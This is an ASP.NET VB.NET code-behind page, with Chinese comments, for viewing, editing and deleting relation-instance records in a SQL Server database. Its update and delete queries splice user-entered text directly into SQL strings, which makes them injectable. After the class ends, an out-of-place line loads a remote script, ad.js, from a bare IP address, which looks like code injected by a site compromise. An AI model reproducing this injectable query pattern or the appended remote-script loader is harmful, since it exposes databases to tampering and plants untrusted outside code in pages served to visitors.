Imports System.Data
Imports System.Data.SqlClient

Public Class rinstancemodification
    Inherits System.Web.UI.Page

#Region " Web 窗体设计器生成的代码 "

    '该调用是 Web 窗体设计器所必需的。
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Form2 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents Label4 As System.Web.UI.WebControls.Label
    Protected WithEvents Label1 As System.Web.UI.WebControls.Label
    Protected WithEvents Label2 As System.Web.UI.WebControls.Label
    Protected WithEvents ddlstInstKey As System.Web.UI.WebControls.DropDownList
    Protected WithEvents rbtnAccPri3 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri2 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri1 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents Label5 As System.Web.UI.WebControls.Label
    Protected WithEvents txtUser As System.Web.UI.WebControls.TextBox
    Protected WithEvents Label10 As System.Web.UI.WebControls.Label
    Protected WithEvents txtOper As System.Web.UI.WebControls.TextBox
    Protected WithEvents Label3 As System.Web.UI.WebControls.Label
    Protected WithEvents txtInstType As System.Web.UI.WebControls.TextBox
    Protected WithEvents btnModify As System.Web.UI.WebControls.Button
    Protected WithEvents btnDel As System.Web.UI.WebControls.Button
    Protected WithEvents btnCancel As System.Web.UI.WebControls.Button
    Protected WithEvents rbtnInstAvailNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnInstAvailYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents btnYes As System.Web.UI.WebControls.Button
    Protected WithEvents btnModifyVertex As System.Web.UI.WebControls.Button
    Protected WithEvents timetext As System.Web.UI.WebControls.Label

    '注意: 以下占位符声明是 Web 窗体设计器所必需的。
    '不要删除或移动它。
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: 此方法调用是 Web 窗体设计器所必需的
        '不要使用代码编辑器修改它。
        InitializeComponent()
    End Sub

#End Region

    Private Sub initial(ByVal index As Integer)
        Me.txtInstType.Text = Session("myDateSet").Tables("rinstance").Rows(index).Item("relationentitytype")
        Me.txtUser.Text = Session("myDateSet").Tables("rinstance").Rows(index).Item("authorizedname")
        Me.txtOper.Text = Session("myDateSet").Tables("rinstance").Rows(index).Item("operator")
        If Session("myDateSet").Tables("rinstance").Rows(index).Item("status") = "1" Then
            Me.rbtnInstAvailNo.Checked = False
            Me.rbtnInstAvailYes.Checked = True
        Else
            Me.rbtnInstAvailYes.Checked = False
            Me.rbtnInstAvailNo.Checked = True
        End If
        Dim temp = Session("myDateSet").Tables("rinstance").Rows(index).Item("accessprivilege")
        If temp = "1" Then
            Me.rbtnAccPri2.Checked = False
            Me.rbtnAccPri3.Checked = False
            Me.rbtnAccPri1.Checked = True
        ElseIf temp = "2" Then
            Me.rbtnAccPri1.Checked = False
            Me.rbtnAccPri3.Checked = False
            Me.rbtnAccPri2.Checked = True
        Else
            Me.rbtnAccPri1.Checked = False
            Me.rbtnAccPri2.Checked = False
            Me.rbtnAccPri3.Checked = True
        End If
    End Sub

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '在此处放置初始化页的用户代码
        Me.lblWarning.Visible = False

        Me.timetext.Text = DateTime.Now.ToString()
        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "您还没登录，请先登录"
        Else
            Me.lblHint.Text = "您好， " + Session("UserName")
        End If

        If Not IsPostBack Then  ' 用户x第一次打开页面时
            Dim strSql As String
            Dim mySqlConn As New SqlConnection(Me.Application("DataBase"))
            Try
                mySqlConn.Open()

                Dim mySqlAdapter As New SqlDataAdapter("select * from rinstance", mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "rinstance")
                Me.ddlstInstKey.DataSource = myDateSet.Tables("rinstance").DefaultView
                Me.ddlstInstKey.DataValueField = "relationkey"
                Me.ddlstInstKey.DataBind()
                Me.Session("myDateSet") = myDateSet
                If Me.ddlstInstKey.Items.Count > 0 Then
                    initial(0)
                    Me.Session("index") = 0
                Else
                    Me.Session("index") = -1
                End If

                mySqlConn.Close()
            Catch ex As SqlException
                Throw ex
                'Response.Redirect("error.htm") ' 错误提示
            Finally
            End Try
        End If
    End Sub

    Private Sub btnModify_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnModify.Click
        If Me.ddlstInstKey.Items.Count <= 0 Then
            Me.lblWarning.Text = "提醒：没有可以修改的关系实例"
            Exit Sub
        End If

        If (Me.txtInstType.Text.Trim() = "" Or Me.txtOper.Text.Trim() = "" Or Me.txtUser.Text.Trim() = "") Then
            Me.lblWarning.Text = "提醒：请先填好全部信息"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim mySqlComm As SqlCommand

        Try
            ' 获取用户权限值，有效性值,是否需要关联对象的确认信息,是否有向
            ' 保存在chrAccPri, chrIsValid，chrNeedAff和chrIsDir中
            Dim chrAccPri As Char
            Dim chrIsValid As Char

            If Me.rbtnAccPri1.Checked = True Then
                chrAccPri = "1"
            ElseIf Me.rbtnAccPri2.Checked = True Then
                chrAccPri = "2"
            Else
                chrAccPri = "3"
            End If
            If Me.rbtnInstAvailYes.Checked = True Then
                chrIsValid = "1"
            Else
                chrIsValid = "0"
            End If

            ' 插入数据项
            strSql = [String].Format("update rinstance set accessprivilege='{0}',latestupdatetime='{1}',authorizedname='{2}',operator='{3}',relationentitytype='{4}',status='{5}' where relationkey='{6}'", _
                chrAccPri, Now.ToString("yyyy-MM-dd HH:mm:ss"), Me.txtUser.Text.Trim(), _
                Me.txtOper.Text.Trim(), Me.txtInstType.Text.Trim(), chrIsValid, Me.ddlstInstKey.SelectedValue.Trim())
            mySqlComm = New SqlCommand(strSql, mySqlConn)
            mySqlConn.Open()
            If (mySqlComm.ExecuteNonQuery() > 0) Then
                Me.lblWarning.Text = "恭喜：修改关系实例" + Me.ddlstInstKey.SelectedValue.Trim() + "成功"
                Me.lblWarning.Visible = True
            Else
                Me.lblWarning.Text = "警告：由于某种原因修改关系实例失败，可能你没有权限"
                Me.lblWarning.Visible = True
            End If

            mySqlConn.Close()
        Catch ex As SqlException
            Throw ex
            'Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try
    End Sub

    Private Sub btnDel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnDel.Click
        If Me.ddlstInstKey.Items.Count <= 0 Then
            Me.lblWarning.Text = "提醒：没有可以删除的关系实例"
            Exit Sub
        End If

        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim mySqlComm As SqlCommand

        Try
            strSql = [String].Format("delete from rvertex where relationkey='{0}'", Me.ddlstInstKey.SelectedValue.Trim())
            mySqlComm = New SqlCommand(strSql, mySqlConn)
            mySqlConn.Open()
            If (mySqlComm.ExecuteNonQuery() <= 0) Then
                Me.lblWarning.Text = "警告：由于某种原因删除关系实例失败，可能你没有权限"
                Me.lblWarning.Visible = True
                mySqlConn.Close()
                Exit Sub
            End If

            strSql = [String].Format("delete from rinstance where relationkey='{0}'", Me.ddlstInstKey.SelectedValue.Trim())
            mySqlComm.CommandText = strSql
            If (mySqlComm.ExecuteNonQuery() > 0) Then
                Me.lblWarning.Text = "恭喜：删除关系实例" + Me.ddlstInstKey.SelectedValue.Trim() + "成功"
                Me.lblWarning.Visible = True
                Me.ddlstInstKey.Items.RemoveAt(Me.ddlstInstKey.SelectedIndex)
                If Me.ddlstInstKey.Items.Count <= 0 Then
                    Me.Session("index") = -1
                ElseIf Me.Session("index") = 0 Then
                    Me.Session("index") = 1
                Else
                    Me.Session("index") = Me.Session("index") - 1
                End If
            Else
                Me.lblWarning.Text = "警告：由于某种原因删除关系实例失败，可能你没有权限"
                Me.lblWarning.Visible = True
            End If

            mySqlConn.Close()
        Catch ex As SqlException
            Throw ex
            'Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try
    End Sub

    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCancel.Click
        Me.lblWarning.Visible = False
        If Me.Session("index") = -1 Then
            Exit Sub
        End If
        Me.ddlstInstKey.SelectedIndex = Me.Session("index")
        initial(Me.Session("index"))
    End Sub

    Private Sub btnYes_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnYes.Click
        If Me.Session("index") = -1 Then
            Exit Sub
        End If
        Me.ddlstInstKey.SelectedIndex = Me.Session("index")
        initial(Me.Session("index"))
    End Sub

    Private Sub ddlstInstKey_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ddlstInstKey.SelectedIndexChanged
        Me.Session("index") = Me.ddlstInstKey.SelectedIndex
    End Sub

    Private Sub btnModifyVertex_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnModifyVertex.Click
        If Me.ddlstInstKey.Items.Count <= 0 Then
            Me.lblWarning.Text = "提醒：没有可以修改的关系实例"
            Exit Sub
        End If
        Me.Session("InstKey") = Me.ddlstInstKey.SelectedValue.Trim()
        Me.Session("DefKey") = Session("myDateSet").Tables("rinstance").Rows(Me.ddlstInstKey.SelectedIndex).Item("rdefinitionkey")
        Me.Response.Redirect("modificationvertex.aspx")
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
